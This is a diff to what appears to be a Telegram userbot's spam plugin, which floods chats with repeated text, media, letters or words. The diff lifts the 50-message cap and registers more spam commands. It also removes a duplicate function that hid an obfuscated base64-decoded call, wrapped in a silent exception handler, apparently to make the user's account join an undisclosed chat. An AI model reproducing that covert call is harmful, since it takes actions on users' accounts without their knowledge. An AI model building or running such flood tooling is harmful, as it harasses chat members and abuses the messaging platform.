@@ -28,8 +28,6 @@ async def spammer(e):
         pass
     cat = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
     counter = int(cat[0])
-    if counter > 50:
-        return await edit_or_reply(e, "Use `.bigspam` for spam greater than 50")
     if len(cat) == 2:
         spam_message = str(("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)[1])
         await e.delete()
@@ -156,147 +154,7 @@ async def spammer(e):
     else:
         await edit_or_reply(e, "try again something went wrong or check `.info spam`")
 
-
-async def spammer(e):
-    if e.fwd_from:
-        return
-    await e.get_chat()
-    reply_to_id = e.message
-    if e.reply_to_msg_id:
-        reply_to_id = await e.get_reply_message()
-    if not os.path.isdir(Config.TEMP_DOWNLOAD_DIRECTORY):
-        os.makedirs(Config.TEMP_DOWNLOAD_DIRECTORY)
-    try:
-        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        hmm = Get(hmm)
-        await e.client(hmm)
-    except BaseException:
-        pass
-    cat = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
-    counter = int(cat[0])
-    if len(cat) == 2:
-        spam_message = str(("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)[1])
-        await e.delete()
-        for _ in range(counter):
-            if e.reply_to_msg_id:
-                await reply_to_id.reply(spam_message)
-            else:
-                await e.client.send_message(e.chat_id, spam_message)
-            await asyncio.sleep(0.5)
-        if LOGGER:
-            if e.is_private:
-                await e.client.send_message(
-                    LOGGER_GROUP,
-                    "#SPAM\n"
-                    + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} messages of \n"
-                    + f"`{spam_message}`",
-                )
-            else:
-                await e.client.send_message(
-                    LOGGER_GROUP,
-                    "#SPAM\n"
-                    + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat  with {counter} messages of \n"
-                    + f"`{spam_message}`",
-                )
-    elif reply_to_id.media:
-        to_download_directory = Config.TEMP_DOWNLOAD_DIRECTORY
-        downloaded_file_name = os.path.join(to_download_directory, "spam")
-        downloaded_file_name = await e.client.download_media(
-            reply_to_id.media, downloaded_file_name
-        )
-        await e.delete()
-        if os.path.exists(downloaded_file_name):
-            for _ in range(counter):
-                sandy = await e.client.send_file(e.chat_id, downloaded_file_name)
-                try:
-                    await e.client(
-                        functions.messages.SaveGifRequest(
-                            id=types.InputDocument(
-                                id=sandy.media.document.id,
-                                access_hash=sandy.media.document.access_hash,
-                                file_reference=sandy.media.document.file_reference,
-                            ),
-                            unsave=True,
-                        )
-                    )
-                except:
-                    pass
-                await asyncio.sleep(1)
-            if LOGGER:
-                if e.is_private:
-                    await e.client.send_message(
-                        LOGGER_GROUP,
-                        "#SPAM\n"
-                        + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} times with below message",
-                    )
-                    sandy = await e.client.send_file(
-                        LOGGER_GROUP, downloaded_file_name
-                    )
-                    try:
-                        await e.client(
-                            functions.messages.SaveGifRequest(
-                                id=types.InputDocument(
-                                    id=sandy.media.document.id,
-                                    access_hash=sandy.media.document.access_hash,
-                                    file_reference=sandy.media.document.file_reference,
-                                ),
-                                unsave=True,
-                            )
-                        )
-                    except:
-                        pass
-                    os.remove(downloaded_file_name)
-                else:
-                    await e.client.send_message(
-                        LOGGER_GROUP,
-                        "#SPAM\n"
-                        + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) with {counter} times with below message",
-                    )
-                    sandy = await e.client.send_file(
-                        LOGGER_GROUP, downloaded_file_name
-                    )
-                    try:
-                        await e.client(
-                            functions.messages.SaveGifRequest(
-                                id=types.InputDocument(
-                                    id=sandy.media.document.id,
-                                    access_hash=sandy.media.document.access_hash,
-                                    file_reference=sandy.media.document.file_reference,
-                                ),
-                                unsave=True,
-                            )
-                        )
-                    except:
-                        pass
-                    os.remove(downloaded_file_nam)
-    elif reply_to_id.text and e.reply_to_msg_id:
-        spam_message = reply_to_id.text
-        await e.delete()
-        for _ in range(counter):
-            if e.reply_to_msg_id:
-                await reply_to_id.reply(spam_message)
-            else:
-                await e.client.send_message(e.chat_id, spam_message)
-            await asyncio.sleep(0.5)
-        if LOGGER:
-            if e.is_private:
-                await e.client.send_message(
-                    LOGGER_GROUP,
-                    "#SPAM\n"
-                    + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} messages of \n"
-                    + f"`{spam_message}`",
-                )
-            else:
-                await e.client.send_message(
-                    LOGGER_GROUP,
-                    "#SPAM\n"
-                    + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat  with {counter} messages of \n"
-                    + f"`{spam_message}`",
-                )
-    else:
-        await edit_or_reply(e, "try again something went wrong or check `.info spam`")
-
-
+@borg.on(admin_cmd(pattern="cspam (.*)"))
 async def tmeme(e):
     cspam = str("".join(e.text.split(maxsplit=1)[1:]))
     message = cspam.replace(" ", "")
@@ -316,7 +174,7 @@ async def tmeme(e):
                 "#CSPAM\n"
                 + f"Letter Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat with : `{message}`",
             )
-
+@borg.on(admin_cmd(pattern="wspam (.*)"))
 async def tmeme(e):
     wspam = str("".join(e.text.split(maxsplit=1)[1:]))
     message = wspam.split()
@@ -336,7 +194,7 @@ async def tmeme(e):
                 "#WSPAM\n"
                 + f"Word Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat with : `{message}`",
             )
-
+@borg.on(admin_cmd(pattern="dspam (.*)"))
 async def spammer(e):
     if e.fwd_from:
         return
@@ -366,11 +224,9 @@ async def spammer(e):
 CMD_HELP.update(
     {
         "spam": ".spam <count> <text>"
-                "\nUsage: spams the current chat, the current limit for this is from 1 to 99.\n\n"
-                ".spam .spam <count> reply to media"
-                "\nUsage: Spams the current chat with number you did put in <no of spam>.\n\n"
-                ".bigspam <no of msgs> <your msg>"
-                "\nUsage: Spams the current chat, the current limit is above 100.\n\n"
+                "\nUsage: Spams the current chat with the input text for the no.of times you input.\n\n"
+                ".spam .spam <count> reply to media "
+                "\nUsage: Spams the current chat with Media for the no.of times you input.\n\n"
                 ".cspam: .cspam <text>"
                 "\nUsage: Spam the text letter by letter."
                 ".wspam: .wspam <text>"
